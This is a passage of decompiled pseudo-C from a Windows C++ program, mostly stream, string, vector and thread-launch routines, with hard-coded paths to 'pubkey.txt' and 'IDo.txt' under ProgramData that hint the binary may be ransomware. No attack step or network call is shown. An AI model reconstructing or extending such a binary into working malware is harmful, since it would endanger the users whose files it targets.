  int v32; // [esp+48h] [ebp-18h]
  int v33; // [esp+4Ch] [ebp-14h]
  _DWORD *v34; // [esp+50h] [ebp-10h]
  int v35; // [esp+5Ch] [ebp-4h]
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v34 = v20;
  v29 = "threaaaaaaaaaads";
  v28 = dword_4F0378;
  v0 = 0;
  v32 = 0;
  v33 = 0;
  v31 = 16;
  v30 = 0;
  v1 = *(_DWORD *)(dword_4F0378[0] + 4);
  v2 = *(int *)((char *)&dword_4F0398 + v1);
  v3 = *(int *)((char *)&dword_4F039C + v1);
  if ( v3 < 0 || v3 <= 0 && v2 < 0x11 )
  {
    v23 = 0i64;
    v4 = 0;
    v5 = 0;
  }
  else
  {
    v4 = (__PAIR64__(v3, v2) - 16) >> 32;
    v5 = v2 - 16;
  }
  sub_41D970(&v21, (int)dword_4F0378);
  v35 = 0;
  if ( v22 )
  {
    LOBYTE(v35) = 1;
    v6 = sub_403720((int *)((char *)dword_4F0378 + *(_DWORD *)(dword_4F0378[0] + 4)), (int)&v25);
    LOBYTE(v35) = 2;
    v27 = sub_4251A0((int)&savedregs, v6);
    LOBYTE(v35) = 1;
    sub_401E00(&v25);
    if ( (*(int *)((char *)&dword_4F038C + *(_DWORD *)(dword_4F0378[0] + 4)) & 0x1C0) != 64 )
    {
      while ( v4 >= 0 && (v4 > 0 || v5) )
      {
        if ( (unsigned __int16)sub_4217C0(
                                 *(_DWORD ***)((char *)&dword_4F03B0 + *(_DWORD *)(dword_4F0378[0] + 4)),
                                 *(unsigned __int16 *)((char *)&word_4F03B8 + *(_DWORD *)(dword_4F0378[0] + 4))) == 0xFFFF )
        {
          v0 = 4;
          v32 = 4;
          v33 = 4;
          break;
        }
        v13 = v5-- != 0;
        LODWORD(v23) = v5;
        v4 = v13 + v4 - 1;
        HIDWORD(v23) = v4;
      }
    }
    v7 = 16;
    v8 = 0;
    v9 = "threaaaaaaaaaads";
    while ( !v0 )
    {
      if ( v8 < 0 || v8 <= 0 && !v7 )
      {
        while ( v4 >= 0 && (v4 > 0 || v5) )
        {
          if ( (unsigned __int16)sub_4217C0(
                                   *(_DWORD ***)((char *)&dword_4F03B0 + *(_DWORD *)(dword_4F0378[0] + 4)),
                                   *(unsigned __int16 *)((char *)&word_4F03B8 + *(_DWORD *)(dword_4F0378[0] + 4))) == 0xFFFF )
          {
            LOBYTE(v0) = 4;
            v33 = 4;
            goto LABEL_28;
          }
          v13 = v5-- != 0;
          LODWORD(v23) = v5;
          v4 = v13 + v4 - 1;
          HIDWORD(v23) = v4;
        }
        break;
      }
      v10 = *(_DWORD ***)((char *)&dword_4F03B0 + *(_DWORD *)(dword_4F0378[0] + 4));
      LOBYTE(v26) = *v9;
      v11 = (*(int (__thiscall **)(char *, int))(*(_DWORD *)v27 + 48))(v27, v26);
      v12 = sub_4217C0(v10, v11);
      v0 = v32;
      if ( v12 == -1 )
        v0 = 4;
      v32 = v0;
      v33 = v0;
      v13 = v31 != 0;
      v7 = v31 - 1;
      v31 = v7;
      v20[4] = v7;
      v8 = v13 + v30 - 1;
      v30 = v8;
      v20[5] = v8;
      v9 = v29 + 1;
      v29 = v9;
      v24 = v9;
    }
LABEL_28:
    v14 = *(_DWORD *)(dword_4F0378[0] + 4);
    *(int *)((char *)&dword_4F0398 + v14) = 0;
    *(int *)((char *)&dword_4F039C + v14) = 0;
    v35 = 0;
  }
  else
  {
    LOBYTE(v0) = 4;
  }
  v15 = v28;
  v16 = (char *)v28 + *(_DWORD *)(dword_4F0378[0] + 4);
  v17 = v0 | v16[12] | 4;
  if ( *((_DWORD *)v16 + 14) )
    v17 = v0 | v16[12];
  sub_4036A0(v16, v17, 0);
  v35 = 4;
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(v21);
  v35 = -1;
  v18 = *(_DWORD *)&v21[*(_DWORD *)(*(_DWORD *)v21 + 4) + 56];
  if ( v18 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v18 + 8))(v18);
  return v15;
}
// 422ADB: conditional instruction was optimized away because ebx.4==0
// 422ADD: conditional instruction was optimized away because ebx.4==0
// 46A06B: using guessed type int j____uncaught_exception(void);
// 4F0378: using guessed type int dword_4F0378[5];
// 4F038C: using guessed type int dword_4F038C;
// 4F0398: using guessed type int dword_4F0398;
// 4F039C: using guessed type int dword_4F039C;
// 4F03B0: using guessed type int dword_4F03B0;
// 4F03B8: using guessed type __int16 word_4F03B8;

//----- (00422D50) --------------------------------------------------------
_BYTE *__cdecl sub_422D50(_BYTE *a1, const char *a2)
{
  __int64 v2; // rcx
  _BYTE *v3; // edx
  int v4; // eax
  unsigned int v5; // esi
  int v6; // edi
  int v7; // edi
  int v8; // esi
  int v9; // ecx
  int v10; // ecx
  int v11; // eax
  _BYTE *v12; // edx
  int v13; // eax
  int v14; // ecx
  bool v15; // cf
  int v16; // eax
  int v17; // edx
  int v18; // eax
  char v19; // al
  char v20; // al
  _BYTE *v21; // esi
  int v22; // ecx
  int v24; // [esp+0h] [ebp-40h] BYREF
  _BYTE *v25; // [esp+10h] [ebp-30h]
  bool v26; // [esp+14h] [ebp-2Ch]
  __int64 v27; // [esp+18h] [ebp-28h]
  int v28; // [esp+24h] [ebp-1Ch]
  _BYTE *v29; // [esp+28h] [ebp-18h]
  int v30; // [esp+2Ch] [ebp-14h]
  int *v31; // [esp+30h] [ebp-10h]
  int v32; // [esp+3Ch] [ebp-4h]

  v31 = &v24;
  v30 = 0;
  v2 = (unsigned int)a2;
  LODWORD(v2) = strlen(a2);
  v28 = v2;
  v3 = a1;
  v4 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v5 = *(_DWORD *)&a1[v4 + 32];
  v6 = *(_DWORD *)&a1[v4 + 36];
  if ( v6 >= 0 && (v6 > 0 || v5 && v5 > (unsigned int)v2) )
  {
    v7 = (__PAIR64__(v6, v5) - v2) >> 32;
    v8 = v5 - v2;
  }
  else
  {
    v27 = 0i64;
    v7 = 0;
    v8 = 0;
  }
  v25 = a1;
  v9 = *(_DWORD *)&a1[v4 + 56];
  if ( v9 )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)v9 + 4))(v9);
    v3 = a1;
  }
  v32 = 0;
  v10 = *(_DWORD *)v3;
  v29 = &v3[*(_DWORD *)(*(_DWORD *)v3 + 4)];
  v11 = v10;
  v12 = a1;
  if ( !*((_DWORD *)v29 + 3) )
  {
    v12 = a1;
    if ( *((_DWORD *)v29 + 15) )
    {
      v2 = *((unsigned int *)v29 + 15);
      if ( (_BYTE *)v2 != a1 )
      {
        sub_4212B0((int *)v2);
        v12 = a1;
        v11 = *(_DWORD *)a1;
      }
    }
  }
  v13 = *(_DWORD *)&v12[*(_DWORD *)(v11 + 4) + 12];
  v26 = v13 == 0;
  v32 = 1;
  if ( v13 )
  {
    BYTE4(v2) = 4;
  }
  else
  {
    LOBYTE(v32) = 2;
    v14 = *(_DWORD *)v12;
    if ( (*(_DWORD *)&v12[*(_DWORD *)(*(_DWORD *)v12 + 4) + 20] & 0x1C0) != 64 )
    {
      while ( v7 >= 0 && (v7 > 0 || v8) )
      {
        if ( sub_425930(
               *(_DWORD ***)&v12[*(_DWORD *)(*(_DWORD *)v12 + 4) + 56],
               v12[*(_DWORD *)(*(_DWORD *)v12 + 4) + 64]) == -1 )
          goto LABEL_29;
        v15 = v8-- != 0;
        LODWORD(v27) = v8;
        v7 = v15 + v7 - 1;
        HIDWORD(v27) = v7;
        v12 = a1;
      }
      v14 = *(_DWORD *)v12;
    }
    v16 = sub_41FD90(*(void **)&v12[*(_DWORD *)(v14 + 4) + 56], (int)a2, v28, 0);
    if ( v16 != v28 || v17 )
    {
LABEL_29:
      BYTE4(v2) = 4;
      v30 = 4;
    }
    else
    {
      while ( v7 >= 0 && (v7 > 0 || v8) )
      {
        if ( sub_425930(*(_DWORD ***)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 56], a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 64]) == -1 )
          goto LABEL_29;
        v15 = v8-- != 0;
        LODWORD(v27) = v8;
        v7 = v15 + v7 - 1;
        HIDWORD(v27) = v7;
      }
    }
    v12 = a1;
    v18 = *(_DWORD *)(*(_DWORD *)a1 + 4);
    *(_DWORD *)&a1[v18 + 32] = 0;
    *(_DWORD *)&a1[v18 + 36] = 0;
    v32 = 1;
  }
  LODWORD(v2) = &v12[*(_DWORD *)(*(_DWORD *)v12 + 4)];
  v19 = BYTE4(v2) | *(_BYTE *)(v2 + 12) | 4;
  if ( *(_DWORD *)(v2 + 56) )
    v19 = BYTE4(v2) | *(_BYTE *)(v2 + 12);
  sub_4036A0((_DWORD *)v2, v19, 0);
  v32 = 4;
  v20 = j____uncaught_exception();
  v21 = v25;
  if ( !v20 )
    sub_421050(v25);
  v32 = -1;
  v22 = *(_DWORD *)&v21[*(_DWORD *)(*(_DWORD *)v21 + 4) + 56];
  if ( v22 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v22 + 8))(v22);
  return a1;
}
// 422DAE: conditional instruction was optimized away because edi.4==0
// 422DB0: conditional instruction was optimized away because edi.4==0
// 422EB0: variable 'v17' is possibly undefined
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (00422FA0) --------------------------------------------------------
int *__cdecl sub_422FA0(int *a1)
{
  unsigned __int8 v1; // al

  v1 = sub_421590((int *)((char *)a1 + *(_DWORD *)(*a1 + 4)), 10);
  sub_4257E0(a1, v1);
  sub_4212B0(a1);
  return a1;
}

//----- (00422FE0) --------------------------------------------------------
int *sub_422FE0()
{
  char v0; // bl
  int v1; // eax
  unsigned int v2; // esi
  int v3; // edi
  int v4; // edi
  unsigned int v5; // esi
  int v6; // ecx
  bool v7; // cf
  int v8; // edx
  int v9; // eax
  int *v10; // esi
  char *v11; // ecx
  char v12; // al
  int v13; // ecx
  int v15; // [esp+0h] [ebp-38h] BYREF
  _BYTE *v16; // [esp+10h] [ebp-28h] BYREF
  char v17; // [esp+14h] [ebp-24h]
  __int64 v18; // [esp+18h] [ebp-20h]
  int *v19; // [esp+20h] [ebp-18h]
  int v20; // [esp+24h] [ebp-14h]
  int *v21; // [esp+28h] [ebp-10h]
  int v22; // [esp+34h] [ebp-4h]

  v21 = &v15;
  v19 = dword_4F0378;
  v0 = 0;
  v20 = 0;
  v1 = *(_DWORD *)(dword_4F0378[0] + 4);
  v2 = *(int *)((char *)&dword_4F0398 + v1);
  v3 = *(int *)((char *)&dword_4F039C + v1);
  if ( v3 < 0 || v3 <= 0 && v2 < 5 )
  {
    v18 = 0i64;
    v4 = 0;
    v5 = 0;
  }
  else
  {
    v4 = (__PAIR64__(v3, v2) - 4) >> 32;
    v5 = v2 - 4;
  }
  sub_41D970(&v16, (int)dword_4F0378);
  v22 = 0;
  if ( v17 )
  {
    LOBYTE(v22) = 1;
    v6 = dword_4F0378[0];
    if ( (*(int *)((char *)&dword_4F038C + *(_DWORD *)(dword_4F0378[0] + 4)) & 0x1C0) != 64 )
    {
      while ( v4 >= 0 && (v4 > 0 || v5) )
      {
        if ( (unsigned __int16)sub_4217C0(
                                 *(_DWORD ***)((char *)&dword_4F03B0 + *(_DWORD *)(v6 + 4)),
                                 *(unsigned __int16 *)((char *)&word_4F03B8 + *(_DWORD *)(v6 + 4))) == 0xFFFF )
          goto LABEL_21;
        v7 = v5-- != 0;
        LODWORD(v18) = v5;
        v4 = v7 + v4 - 1;
        HIDWORD(v18) = v4;
        v6 = dword_4F0378[0];
      }
    }
    if ( (*(int (__thiscall **)(_DWORD, const wchar_t *, int, _DWORD))(**(_DWORD **)((char *)&dword_4F03B0
                                                                                   + *(_DWORD *)(v6 + 4))
                                                                     + 36))(
           *(int *)((char *)&dword_4F03B0 + *(_DWORD *)(v6 + 4)),
           L"shit",
           4,
           0) != 4
      || v8 )
    {
LABEL_21:
      v0 = 4;
      v20 = 4;
    }
    else
    {
      while ( v4 >= 0 && (v4 > 0 || v5) )
      {
        if ( (unsigned __int16)sub_4217C0(
                                 *(_DWORD ***)((char *)&dword_4F03B0 + *(_DWORD *)(dword_4F0378[0] + 4)),
                                 *(unsigned __int16 *)((char *)&word_4F03B8 + *(_DWORD *)(dword_4F0378[0] + 4))) == 0xFFFF )
          goto LABEL_21;
        v7 = v5-- != 0;
        LODWORD(v18) = v5;
        v4 = v7 + v4 - 1;
        HIDWORD(v18) = v4;
      }
    }
    v9 = *(_DWORD *)(dword_4F0378[0] + 4);
    *(int *)((char *)&dword_4F0398 + v9) = 0;
    *(int *)((char *)&dword_4F039C + v9) = 0;
    v22 = 0;
  }
  else
  {
    v0 = 4;
  }
  v10 = v19;
  v11 = (char *)v19 + *(_DWORD *)(dword_4F0378[0] + 4);
  v12 = v0 | v11[12] | 4;
  if ( *((_DWORD *)v11 + 14) )
    v12 = v0 | v11[12];
  sub_4036A0(v11, v12, 0);
  v22 = 3;
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(v16);
  v22 = -1;
  v13 = *(_DWORD *)&v16[*(_DWORD *)(*(_DWORD *)v16 + 4) + 56];
  if ( v13 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v13 + 8))(v13);
  return v10;
}
// 423037: conditional instruction was optimized away because edi.4==0
// 423039: conditional instruction was optimized away because edi.4==0
// 4230F7: variable 'v8' is possibly undefined
// 46A06B: using guessed type int j____uncaught_exception(void);
// 4CD1C4: using guessed type wchar_t aShit[5];
// 4F0378: using guessed type int dword_4F0378[5];
// 4F038C: using guessed type int dword_4F038C;
// 4F0398: using guessed type int dword_4F0398;
// 4F039C: using guessed type int dword_4F039C;
// 4F03B0: using guessed type int dword_4F03B0;
// 4F03B8: using guessed type __int16 word_4F03B8;

//----- (00423200) --------------------------------------------------------
unsigned int __cdecl sub_423200(int a1, unsigned int a2)
{
  unsigned int *v2; // ecx
  unsigned int result; // eax
  unsigned int *v4; // esi
  unsigned int v5; // ecx
  unsigned int v6; // edi
  unsigned int v7; // ecx
  unsigned int v8; // eax
  int v9; // esi
  char v10; // cl
  unsigned int v11; // [esp+4h] [ebp-18h]
  unsigned int *v12; // [esp+10h] [ebp-Ch]
  char *v13; // [esp+14h] [ebp-8h]

  result = a2;
  v4 = v2;
  v12 = v2;
  if ( a1 != a2 )
  {
    v5 = a2 - (a1 + 1);
    v13 = (char *)(a1 + 1);
    if ( a1 + 1 > a2 )
      v5 = 0;
    v11 = v5;
    if ( v5 )
    {
      v6 = 2;
      while ( 1 )
      {
        v7 = 0;
        v8 = 0;
        if ( v6 != 1 )
        {
          v7 = sub_427C60(v4);
          v8 = -1;
        }
        if ( v7 / v6 >= v8 / v6 )
        {
          v4 = v12;
          if ( v8 % v6 != v6 - 1 )
            continue;
        }
        v9 = v7 % v6;
        if ( v7 % v6 != v6 - 1 )
        {
          v10 = *v13;
          *v13 = *(_BYTE *)(v9 + a1);
          *(_BYTE *)(v9 + a1) = v10;
        }
        v4 = v12;
        ++v6;
        ++v13;
        result = v6 - 2;
        if ( v6 - 2 == v11 )
          break;
      }
    }
  }
  return result;
}
// 42321A: variable 'v2' is possibly undefined

//----- (004232C0) --------------------------------------------------------
char __cdecl sub_4232C0(_DWORD *a1, const char *a2)
{
  const char *v2; // edx
  unsigned int v3; // edi
  _DWORD *v4; // ecx
  unsigned int v5; // esi
  bool v6; // cf
  unsigned int v7; // esi

  v2 = a2;
  v3 = strlen(a2);
  v4 = a1;
  v5 = a1[4];
  if ( a1[5] >= 0x10u )
    v4 = (_DWORD *)*a1;
  if ( v5 == v3 )
  {
    v6 = v5 < 4;
    v7 = v5 - 4;
    if ( v6 )
    {
LABEL_7:
      if ( v7 == -4 )
        return 1;
    }
    else
    {
      while ( *v4 == *(_DWORD *)v2 )
      {
        ++v4;
        v2 += 4;
        v6 = v7 < 4;
        v7 -= 4;
        if ( v6 )
          goto LABEL_7;
      }
    }
    if ( *(_BYTE *)v4 == *v2
      && (v7 == -3
       || *((_BYTE *)v4 + 1) == v2[1]
       && (v7 == -2 || *((_BYTE *)v4 + 2) == v2[2] && (v7 == -1 || *((_BYTE *)v4 + 3) == v2[3]))) )
    {
      return 1;
    }
  }
  return 0;
}

//----- (00423340) --------------------------------------------------------
void *__thiscall sub_423340(void *this, int a2, int a3)
{
  int v5; // [esp+Ch] [ebp-14h]

  v5 = (int)this;
  LOBYTE(v5) = 0;
  sub_427E80(v5, "C:\\ProgramData\\IDo.txt", 0x16u);
  return this;
}

//----- (004233D0) --------------------------------------------------------
void *__thiscall sub_4233D0(void *this, int a2, int a3)
{
  int v5; // [esp+Ch] [ebp-14h]

  v5 = (int)this;
  LOBYTE(v5) = 0;
  sub_427E80(v5, "C:\\ProgramData\\pubkey.txt", 0x19u);
  return this;
}

//----- (00423460) --------------------------------------------------------
void *__thiscall sub_423460(void *this, int a2, int a3)
{
  int v5; // [esp+Ch] [ebp-14h]

  v5 = (int)this;
  LOBYTE(v5) = 0;
  sub_427E80(v5, "C:\\ProgramData", 0xEu);
  return this;
}

//----- (004234F0) --------------------------------------------------------
char __fastcall sub_4234F0(int *a1, const char *a2)
{
  const char *v2; // esi
  unsigned int v3; // edi
  unsigned int v4; // edx
  bool v5; // cf
  unsigned int v6; // edx

  v2 = a2;
  v3 = strlen(a2);
  v4 = a1[4];
  if ( (unsigned int)a1[5] >= 0x10 )
    a1 = (int *)*a1;
  if ( v4 == v3 )
  {
    v5 = v4 < 4;
    v6 = v4 - 4;
    if ( v5 )
    {
LABEL_7:
      if ( v6 == -4 )
        return 0;
    }
    else
    {
      while ( *a1 == *(_DWORD *)v2 )
      {
        ++a1;
        v2 += 4;
        v5 = v6 < 4;
        v6 -= 4;
        if ( v5 )
          goto LABEL_7;
      }
    }
    if ( *(_BYTE *)a1 == *v2
      && (v6 == -3
       || *((_BYTE *)a1 + 1) == v2[1]
       && (v6 == -2 || *((_BYTE *)a1 + 2) == v2[2] && (v6 == -1 || *((_BYTE *)a1 + 3) == v2[3]))) )
    {
      return 0;
    }
  }
  return 1;
}

//----- (00423570) --------------------------------------------------------
int __thiscall sub_423570(int this, char *a2, char *a3, int a4)
{
  int v6; // [esp+Ch] [ebp-4h]

  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 7;
  *(_WORD *)this = 0;
  sub_419280((void **)this, a3 - a2);
  sub_427DF0((void **)this, a2, a3, v6);
  return this;
}
// 4235A5: variable 'v6' is possibly undefined

//----- (004235C0) --------------------------------------------------------
_Thrd_imp_t *__thiscall sub_4235C0(
        _Thrd_imp_t *this,
        int a2,
        _DWORD *a3,
        _DWORD *a4,
        _DWORD *a5,
        int a6,
        _DWORD *a7,
        _DWORD *a8)
{
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  _DWORD *v11; // esi
  struct _Cnd_internal_imp_t *v12; // esi
  struct _Mtx_internal_imp_t *v13; // edi
  int v14; // eax
  _DWORD *v16; // [esp+18h] [ebp-40h]
  _Mtx_t v18[4]; // [esp+2Ch] [ebp-2Ch] BYREF
  _DWORD *v19; // [esp+3Ch] [ebp-1Ch]
  int v20; // [esp+40h] [ebp-18h]
  _Mtx_t v21; // [esp+44h] [ebp-14h]
  int v22; // [esp+54h] [ebp-4h]

  v22 = 0;
  v16 = operator new(0x80u);
  sub_419530(v16, a8);
  sub_419530(v16 + 6, a7);
  v16[12] = a6;
  sub_419530(v16 + 13, a5);
  sub_419BE0(v16 + 19, a4);
  v21 = (_Mtx_t)(v16 + 25);
  sub_419530(v16 + 25, a3);
  v16[31] = a2;
  LOBYTE(v22) = 0;
  *(_OWORD *)v18 = 0i64;
  v19 = 0;
  sub_404E70((int)v18);
  v18[0] = (_Mtx_t)&std::_LaunchPad<std::unique_ptr<std::tuple<void (__cdecl *)(std::wstring const &,std::string,std::wstring,unsigned char * const,std::wstring,std::wstring),std::wstring,std::string,std::wstring,unsigned char *,std::wstring,std::wstring>>>::`vftable';
  v19 = v16;
  LOBYTE(v22) = 21;
  v8 = _Thrd_start(this, (_Thrd_callback_t)sub_405000, v18);
  v9 = 1;
  if ( v8 != 4 )
    v9 = v8;
  if ( v9 )
    std::_Throw_C_error(v9);
  while ( !LOBYTE(v18[3]) )
  {
    v10 = sub_46915E((int)v18[1], v18[2]);
    if ( v10 )
      std::_Throw_C_error(v10);
  }
  LOBYTE(v22) = 22;
  v11 = v19;
  if ( v19 )
  {
    v21 = (_Mtx_t)v19;
    LOBYTE(v22) = 22;
    sub_425AC0(v19);
    sub_46C87D(v11);
  }
  v12 = v18[1];
  v20 = 1;
  v21 = v18[1];
  v13 = v18[2];
  LOBYTE(v22) = 26;
  v14 = _Mtx_unlock(v18[2]);
  if ( v14 )
    std::_Throw_C_error(v14);
  LOBYTE(v22) = 25;
  _Mtx_destroy(v13);
  LOBYTE(v22) = 0;
  _Cnd_destroy(v12);
  return this;
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4CF3EC: using guessed type void *std::_LaunchPad<std::unique_ptr<std::tuple<void (__cdecl *)(std::wstring const &,std::string,std::wstring,unsigned char * const,std::wstring,std::wstring),std::wstring,std::string,std::wstring,unsigned char *,std::wstring,std::wstring>>>::`vftable';

//----- (004237E0) --------------------------------------------------------
void (__thiscall **__cdecl sub_4237E0(int a1, int a2, void (__thiscall *a3)(int)))(int)
{
  void (__thiscall **v3)(int); // ecx
  int v4; // esi
  void (__thiscall **v5)(int); // ebx
  void (__thiscall **result)(int); // eax

  v4 = a1;
  v5 = v3;
  if ( a1 == a2 )
  {
    *v3 = a3;
    return v3;
  }
  else
  {
    do
    {
      a3(v4);
      v4 += 8;
    }
    while ( v4 != a2 );
    result = v5;
    *v5 = a3;
  }
  return result;
}
// 4237E8: variable 'v3' is possibly undefined

//----- (00423820) --------------------------------------------------------
_Thrd_imp_t *__thiscall sub_423820(
        _Thrd_imp_t *this,
        int a2,
        _DWORD *a3,
        _DWORD *a4,
        _DWORD *a5,
        _DWORD *a6,
        _DWORD *a7)
{
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  _DWORD *v10; // esi
  struct _Cnd_internal_imp_t *v11; // esi
  struct _Mtx_internal_imp_t *v12; // edi
  int v13; // eax
  _DWORD *v15; // [esp+18h] [ebp-40h]
  _Mtx_t v17[4]; // [esp+2Ch] [ebp-2Ch] BYREF
  _DWORD *v18; // [esp+3Ch] [ebp-1Ch]
  int v19; // [esp+40h] [ebp-18h]
  _Mtx_t v20; // [esp+44h] [ebp-14h]
  int v21; // [esp+54h] [ebp-4h]

  v21 = 0;
  v15 = operator new(0x7Cu);
  sub_419530(v15, a7);
  sub_419530(v15 + 6, a6);
  sub_419530(v15 + 12, a5);
  sub_419530(v15 + 18, a4);
  v20 = (_Mtx_t)(v15 + 24);
  sub_419530(v15 + 24, a3);
  v15[30] = sub_410330;
  LOBYTE(v21) = 0;
  *(_OWORD *)v17 = 0i64;
  v18 = 0;
  sub_404E70((int)v17);
  v17[0] = (_Mtx_t)&std::_LaunchPad<std::unique_ptr<std::tuple<void (__cdecl *)(std::wstring const &,std::wstring,std::wstring,std::wstring,std::wstring),std::wstring,std::wstring,std::wstring,std::wstring,std::wstring>>>::`vftable';
  v18 = v15;
  LOBYTE(v21) = 20;
  v7 = _Thrd_start(this, (_Thrd_callback_t)sub_405000, v17);
  v8 = 1;
  if ( v7 != 4 )
    v8 = v7;
  if ( v8 )
    std::_Throw_C_error(v8);
  while ( !LOBYTE(v17[3]) )
  {
    v9 = sub_46915E((int)v17[1], v17[2]);
    if ( v9 )
      std::_Throw_C_error(v9);
  }
  LOBYTE(v21) = 21;
  v10 = v18;
  if ( v18 )
  {
    v20 = (_Mtx_t)v18;
    LOBYTE(v21) = 21;
    sub_425A10(v18);
    sub_46C87D(v10);
  }
  v11 = v17[1];
  v19 = 1;
  v20 = v17[1];
  v12 = v17[2];
  LOBYTE(v21) = 25;
  v13 = _Mtx_unlock(v17[2]);
  if ( v13 )
    std::_Throw_C_error(v13);
  LOBYTE(v21) = 24;
  _Mtx_destroy(v12);
  LOBYTE(v21) = 0;
  _Cnd_destroy(v11);
  return this;
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4CF8DC: using guessed type void *std::_LaunchPad<std::unique_ptr<std::tuple<void (__cdecl *)(std::wstring const &,std::wstring,std::wstring,std::wstring,std::wstring),std::wstring,std::wstring,std::wstring,std::wstring,std::wstring>>>::`vftable';

//----- (00423A30) --------------------------------------------------------
int __thiscall sub_423A30(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v4; // edx
  int v5; // ebx
  int v6; // eax
  unsigned int v7; // edi
  unsigned int v8; // ecx
  unsigned int v9; // edx
  unsigned int v10; // eax
  unsigned int v11; // ecx
  size_t v12; // eax
  void *v13; // eax
  _DWORD *v14; // edi
  _DWORD *v15; // ecx
  _DWORD *v16; // ebx
  _DWORD *v17; // edx
  _DWORD *v18; // edx
  _DWORD *v19; // ecx
  _DWORD *v20; // eax
  _DWORD *v21; // ecx
  _DWORD v23[5]; // [esp+0h] [ebp-44h] BYREF
  _DWORD *v24; // [esp+14h] [ebp-30h]
  unsigned int v25; // [esp+18h] [ebp-2Ch]
  int v26; // [esp+1Ch] [ebp-28h]
  _DWORD *v27; // [esp+20h] [ebp-24h]
  unsigned int v28; // [esp+24h] [ebp-20h]
  _DWORD *v29; // [esp+28h] [ebp-1Ch]
  _DWORD *v30; // [esp+2Ch] [ebp-18h]
  _DWORD *v31; // [esp+30h] [ebp-14h]
  _DWORD *v32; // [esp+34h] [ebp-10h]
  int v33; // [esp+40h] [ebp-4h]

  v32 = v23;
  v29 = a2;
  v27 = a3;
  v4 = (_DWORD *)*this;
  v5 = ((int)a2 - *this) >> 3;
  v6 = (this[1] - *this) >> 3;
  if ( v6 == 0x1FFFFFFF )
    sub_420130();
  v7 = v6 + 1;
  v26 = v6 + 1;
  v8 = (this[2] - (int)v4) >> 3;
  v9 = (unsigned int)((this[2] - (int)v4) >> 3) >> 1;
  if ( v8 <= 0x1FFFFFFF - v9 )
  {
    v10 = v9 + v8;
    if ( v9 + v8 < v7 )
      v10 = v7;
    v28 = v10;
  }
  else
  {
    v10 = v6 + 1;
    v28 = v7;
  }
  v11 = 8 * v10;
  v25 = 8 * v10;
  if ( v10 > 0x1FFFFFFF )
  {
    v11 = -1;
LABEL_10:
    v12 = v11 + 35;
    if ( v11 + 35 <= v11 )
      v12 = -1;
    v13 = operator new(v12);
    if ( !v13 )
      goto LABEL_32;
    v14 = (_DWORD *)(((unsigned int)v13 + 35) & 0xFFFFFFE0);
    *(v14 - 1) = v13;
    goto LABEL_17;
  }
  if ( v11 >= 0x1000 )
    goto LABEL_10;
  if ( v11 )
  {
    v14 = operator new(8 * v10);
    v30 = v14;
    goto LABEL_18;
  }
  v14 = 0;
LABEL_17:
  v30 = v14;
LABEL_18:
  v15 = &v14[2 * v5];
  v24 = v15;
  v16 = v15 + 2;
  v23[4] = v15 + 2;
  v31 = v15 + 2;
  v33 = 0;
  v17 = v27;
  *v15 = *v27;
  v15[1] = v17[1];
  *v17 = 0;
  v17[1] = 0;
  v31 = v15;
  v18 = (_DWORD *)this[1];
  v19 = (_DWORD *)*this;
  if ( v29 == v18 )
  {
    sub_426DB0(v19, v18, v14);
  }
  else
  {
    sub_426DB0(v19, v29, v14);
    v31 = v14;
    sub_426DB0(v29, (_DWORD *)this[1], v16);
  }
  v33 = -1;
  v20 = (_DWORD *)*this;
  if ( *this )
  {
    v21 = (_DWORD *)this[1];
    if ( v20 != v21 )
    {
      do
      {
        if ( v20[1] )
          terminate(v21);
        v20 += 2;
      }
      while ( v20 != v21 );
      v20 = (_DWORD *)*this;
    }
    if ( ((this[2] - (_DWORD)v20) & 0xFFFFFFF8) < 0x1000 )
      goto LABEL_29;
    if ( (unsigned int)v20 - *(v20 - 1) - 4 <= 0x1F )
    {
      v20 = (_DWORD *)*(v20 - 1);
LABEL_29:
      sub_46C87D(v20);
      goto LABEL_30;
    }
LABEL_32:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_30:
  *this = v14;
  this[1] = &v14[2 * v26];
  this[2] = &v14[v25 / 4];
  return (int)v24;
}
// 420130: using guessed type void __noreturn sub_420130(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00423C30) --------------------------------------------------------
char __thiscall sub_423C30(unsigned int *this, char *a2, char *a3, int a4)
{
  _DWORD *v5; // eax
  _DWORD v7[9]; // [esp+0h] [ebp-24h] BYREF

  v7[5] = v7;
  v7[4] = this;
  LOBYTE(v5) = sub_41D730(this, (a3 - a2) / 24);
  if ( (_BYTE)v5 )
  {
    v7[8] = 0;
    v5 = sub_426D00(a2, a3, (_DWORD *)*this);
    this[1] = (unsigned int)v5;
  }
  return (char)v5;
}

//----- (00423CD0) --------------------------------------------------------
_DWORD *__thiscall sub_423CD0(int *this, int a2, _DWORD *a3)
{
  int v4; // esi
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // esi
  int v13; // edx
  int v14; // ecx
  void *v15; // ebx
  int v17; // [esp+0h] [ebp-44h] BYREF
  unsigned int v18; // [esp+10h] [ebp-34h]
  unsigned int v19; // [esp+14h] [ebp-30h]
  _DWORD *v20; // [esp+18h] [ebp-2Ch]
  unsigned int v21; // [esp+1Ch] [ebp-28h]
  _DWORD *v22; // [esp+20h] [ebp-24h]
  int v23; // [esp+24h] [ebp-20h]
